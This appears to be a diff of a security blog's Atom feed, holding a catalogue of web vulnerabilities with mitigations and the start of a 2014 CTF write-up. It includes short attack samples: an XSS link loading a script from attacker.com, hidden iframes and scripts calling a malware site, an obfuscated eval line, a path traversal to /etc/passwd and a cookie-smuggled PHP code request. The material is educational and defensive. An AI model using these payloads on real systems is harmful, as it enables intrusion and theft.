@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/rfi.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-31T06:30:00-04:00</updated><entry><title>A List of Common Web Vulnerabilities</title><link href="http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html" rel="alternate"></link><updated>2014-10-31T06:30:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-31:a-list-of-common-web-vulnerabilities.html</id><summary type="html">&lt;p&gt;Although nomenclatures don't help  much when you are facing a security problem, I am keeping this list for a systematic organization. It is constantly been updated.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - RFI</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/rfi.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-10-31T06:30:00-04:00</updated><entry><title>A List of Common Web Vulnerabilities</title><link href="http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html" rel="alternate"></link><published>2014-10-31T06:30:00-04:00</published><updated>2014-10-31T06:30:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-31:/a-list-of-common-web-vulnerabilities.html</id><summary type="html">&lt;p&gt;Although nomenclatures don't help  much when you are facing a security problem, I am keeping this list for a systematic organization. It is constantly been updated.&lt;/p&gt;
+&lt;p&gt;In addition to this list, you can check some specific web exploration older posts: &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Exploiting the web in 20 lessons&lt;/a&gt; and &lt;a href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html"&gt;D-Camp CTF 2014 …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Although nomenclatures don't help  much when you are facing a security problem, I am keeping this list for a systematic organization. It is constantly been updated.&lt;/p&gt;
 &lt;p&gt;In addition to this list, you can check some specific web exploration older posts: &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Exploiting the web in 20 lessons&lt;/a&gt; and &lt;a href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html"&gt;D-Camp CTF 2014&lt;/a&gt;.&lt;/p&gt;
 &lt;h1&gt;Vulnerabilities to Web Applications&lt;/h1&gt;
 &lt;h2&gt;Cross-site Scripting (XSS)&lt;/h2&gt;
@@ -23,14 +24,14 @@
 &lt;ol&gt;
 &lt;li&gt;The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=&amp;lt;script%20type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;Pwnd!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://website.org?q=&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="na"&gt;20type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;alert(&amp;#39;Pwnd!&amp;#39;);&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ol&gt;
 &lt;li&gt;The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -72,11 +73,11 @@
 &lt;p&gt;Clients should disabling scripts by default (for example with &lt;a href="https://addons.mozilla.org/en-us/firefox/addon/noscript/"&gt;NoScript&lt;/a&gt;).&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Cross Script Inclusion (XSSI)&lt;/h2&gt;
 &lt;p&gt;XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via &lt;code&gt;&amp;lt;script src=..&amp;gt;&lt;/code&gt;, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.&lt;/p&gt;
 &lt;p&gt;For instance, JSON is a JavaScript syntax structure  to keep in-place object serialization.  The curly bracket &lt;strong&gt;{&lt;/strong&gt; is assumed to be the beginning of the object. Overloading curly  brackets means that JSON blocks will not be recognized properly in standalone statements.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Cross-site Request Forgery (CSRF, XSRF)&lt;/h2&gt;
 &lt;p&gt;CSRF allows attackers to execute actions using the credentials of another user without that user's knowledge or consent. It is  the failure to verify that a particular state-changing HTTP request received by the &lt;strong&gt;server-side&lt;/strong&gt; portion of the application was initiated from the expected &lt;strong&gt;client-side&lt;/strong&gt; origin. Any third-party website loaded in the browser can perform actions in behalf of the victim.&lt;/p&gt;
 &lt;p&gt;On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site and  it might be granted the same privilege.&lt;/p&gt;
@@ -98,50 +99,50 @@
 &lt;p&gt;Including a secret user- and session- specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the &lt;strong&gt;same-origin&lt;/strong&gt; policy.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Header Injection (Response Splitting)&lt;/h2&gt;
 &lt;p&gt;Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.&lt;/p&gt;
 &lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Mixed Content&lt;/h2&gt;
 &lt;p&gt;Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, specially in open wireless networks.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Open Redirection&lt;/h2&gt;
 &lt;p&gt;Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Referer Leakage&lt;/h2&gt;
 &lt;p&gt;HTTP requests may include a &lt;em&gt;Referer&lt;/em&gt; header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.&lt;/p&gt;
 &lt;p&gt;This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the &lt;em&gt;Referer&lt;/em&gt; header.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h1&gt;Vulnerabilities to Web Application Design&lt;/h1&gt;
 &lt;h2&gt;Cache Poising&lt;/h2&gt;
 &lt;p&gt;Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Clickjacking&lt;/h2&gt;
 &lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.&lt;/p&gt;
 &lt;p&gt;If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;blog_posts&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;post_text&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iframe&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT * FROM blog_posts WHERE post_text LIKE &amp;#39;%&amp;gt;iframe%&amp;#39;;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Content and Character Set Sniffing&lt;/h2&gt;
 &lt;p&gt;Possibility that the browser will ignore any authoritative content type of character set information provided by the server and interpret the returned document incorrectly.&lt;/p&gt;
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Scenarios where &lt;a href="http://www.w3.org/Protocols/rfc1341/4_Content-Type.html"&gt;Content-Type&lt;/a&gt; is ignored.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Cookie Forcing/Injection&lt;/h2&gt;
 &lt;p&gt;Possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in  browsers. There are special concern to HTTPS applications.&lt;/p&gt;
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Cookie stuffing: deleting cookies belonging to another applications by overflowing the cookie jar.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Denial-of-Service (DoS)&lt;/h2&gt;
 &lt;p&gt;Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application  more difficult.&lt;/p&gt;
 &lt;h3&gt;DoS and amplification attacks&lt;/h3&gt;
@@ -152,49 +153,49 @@
 &lt;li&gt;The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..&lt;/li&gt;
 &lt;li&gt;The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Framebusting&lt;/h2&gt;
 &lt;p&gt;The possibility of a framed page navigating the top-level document to a new URL without having to satisfy &lt;strong&gt;same-origin&lt;/strong&gt; checks. It might be exploited for phishing.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;HTTP Downgrade&lt;/h2&gt;
 &lt;p&gt;Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.&lt;/p&gt;
 &lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"&gt;Strict transport security&lt;/a&gt;:  The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over  HTTPS.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Network Fenceposts&lt;/h2&gt;
 &lt;p&gt;When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with help of &lt;a href="http://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding&lt;/a&gt;.&lt;/p&gt;
 &lt;h3&gt;Attempts of mitigation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Internet Explorer implements the zone model, a potential approach to the risk.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h1&gt;Vulnerabilities in the Server-Side&lt;/h1&gt;
 &lt;h2&gt;Buffer Overflow&lt;/h2&gt;
 &lt;p&gt;In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Command Injection (SQL, PHP, Shellcode)&lt;/h2&gt;
 &lt;p&gt;Due to insufficient input filtering or output escaping, an attacker-controlled strings may be processed as statements in an interpreted language used by the application.&lt;/p&gt;
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Malicious code injections in an iframe to the attack site:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class="na"&gt;frameborder=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://&amp;lt;attack-site&amp;gt;/path/file&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class="na"&gt;frameborder=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://&amp;lt;attack-site&amp;gt;/path/file&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;JavaScript or another scripting language that calls and runs scripts from an attack site:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://malware-attack-site/js/x55.js&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://malware-attack-site/js/x55.js&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Scripts that redirects the browser to an attack site:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
   if (document.referrer.match(/google\.com/)) {
     window.location(&amp;quot;http://malware-attack-site/&amp;quot;);
   }
@@ -205,16 +206,16 @@
 &lt;ul&gt;
 &lt;li&gt;Malicious code that is obfuscated to avoid detection:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;eval(base64_decode(&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;));
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Shared object files designed to randomly write harmful code to otherwise benign scripts:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#httpd.conf modified by the hacker&lt;/span&gt;
-&lt;span class="n"&gt;LoadModule&lt;/span&gt; &lt;span class="n"&gt;harmful_module&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
-&lt;span class="n"&gt;AddModule&lt;/span&gt; &lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#httpd.conf modified by the hacker
+LoadModule harmful_module modules/mod_harmful.so
+AddModule mod_harmful.c
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -225,27 +226,27 @@
 &lt;ul&gt;
 &lt;li&gt;Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ | less
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ &lt;span class="p"&gt;|&lt;/span&gt; less
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Directory Traversal&lt;/h2&gt;
 &lt;p&gt;Due to insufficient filtering (such as the failure to recognize &lt;code&gt;../&lt;/code&gt; segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;File Inclusion&lt;/h2&gt;
 &lt;p&gt;If used without a qualifier or prefixed with a &lt;em&gt;local&lt;/em&gt; (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLS, which might supplies the ability of retrieving attacker's files.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Format String Vulnerability&lt;/h2&gt;
 &lt;p&gt;Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example,  C has functions such as &lt;em&gt;printf&lt;/em&gt;, &lt;em&gt;syslog&lt;/em&gt;, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to  data leaks and code execution.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Integer Overflow&lt;/h2&gt;
 &lt;p&gt;Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific  result.&lt;/p&gt;
 &lt;p&gt;Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Pointer Management Vulnerabilities&lt;/h2&gt;
 &lt;p&gt;In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Cache poisoning attacks&lt;/h2&gt;
 &lt;p&gt;Several variants of DNS spoofing attacks that can result in cache poisoning.&lt;/p&gt;
 &lt;h3&gt;Example of Attack&lt;/h3&gt;
@@ -266,14 +267,16 @@
 &lt;p&gt;Future queries for the compromised domain or zone are answered with the forged DNS resolutions from the cache. If the attacker has specified a very long time-to-live on the forged response, the forged records stay in the cache for as long as possible without being refreshed.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h1&gt;References:&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886"&gt;The Tangled Web&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/security/"&gt;Django Security&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/security/"&gt;Bleach: Sanitizing Tool in Python&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://developers.google.com/speed/public-dns/docs/security"&gt;Google's Public DNS&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="XSS"></category><category term="CSRF"></category><category term="XSSI"></category><category term="Buffer_Overflow"></category><category term="LFI"></category><category term="RFI"></category><category term="iframe"></category><category term="SQLi"></category></entry><entry><title>Exploring D-CTF Quals 2014's Exploits</title><link href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html" rel="alternate"></link><updated>2014-10-22T06:30:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-22:exploring-d-ctf-quals-2014s-exploits.html</id><summary type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
+&lt;/ul&gt;</content><category term="XSS"></category><category term="CSRF"></category><category term="XSSI"></category><category term="Buffer_Overflow"></category><category term="LFI"></category><category term="RFI"></category><category term="iframe"></category><category term="SQLi"></category></entry><entry><title>Exploring D-CTF Quals 2014's Exploits</title><link href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html" rel="alternate"></link><published>2014-10-22T06:30:00-04:00</published><updated>2014-10-22T06:30:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-10-22:/exploring-d-ctf-quals-2014s-exploits.html</id><summary type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Vulnerabilities&lt;/h2&gt;
+&lt;h3&gt;Remote File …&lt;/h3&gt;</summary><content type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
 &lt;h2&gt;Vulnerabilities&lt;/h2&gt;
 &lt;h3&gt;Remote File Inclusion and Local File Inclusion Vulnerabilities&lt;/h3&gt;
 &lt;p&gt;In &lt;a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion"&gt;Remote File Inclusion&lt;/a&gt; (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's &lt;a href="http://php.net/manual/en/function.include.php"&gt;include()&lt;/a&gt; is extremely vulnerable to RFI attacks.&lt;/p&gt;
@@ -285,7 +288,7 @@
 &lt;h3&gt;CMS Mini and RFI&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.mini-print.com/"&gt;CMS Mini&lt;/a&gt; is file system to build simple websites. It has &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt; such as &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)"&gt;CSRF&lt;/a&gt;, RFI, and &lt;a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;XSS&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;An example of RFI vulnerability in CMS Mini is explored using curl:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
 &lt;span class="err"&gt;[target/IP]/cmsmini/admin/edit.php?path=&amp;amp;name=../../../../../etc/passwd&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -294,13 +297,13 @@
 &lt;h3&gt;ApPHP and Remote Code Execution&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.apphp.com/"&gt;ApPHP&lt;/a&gt; is a blog script. It is known for having  &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"&gt;remote code execution&lt;/a&gt; (RCE). An example of RCE exploit for ApPHP &lt;a href="http://www.exploit-db.com/exploits/33070/"&gt;can be seen here&lt;/a&gt;. A good start is to check the PHP's &lt;a href="http://php.net/manual/en/ini.core.php#ini.disable-functions"&gt;disable_function&lt;/a&gt; list for stuff to hacker the server.&lt;/p&gt;
 &lt;p&gt;In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use &lt;a href="http://php.net/manual/en/reserved.variables.post.php"&gt;$_POST&lt;/a&gt; and &lt;a href="http://php.net/manual/en/reserved.variables.cookies.php"&gt;$_COOKIE&lt;/a&gt; to send strings to functions such as &lt;a href="http://php.net/manual/en/function.scandir.php"&gt;scandir()&lt;/a&gt; and &lt;a href="http://php.net/manual/en/function.file-get-contents.php"&gt;get_file_contents()&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
 &lt;span class="err"&gt;Cookie: 0=include&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
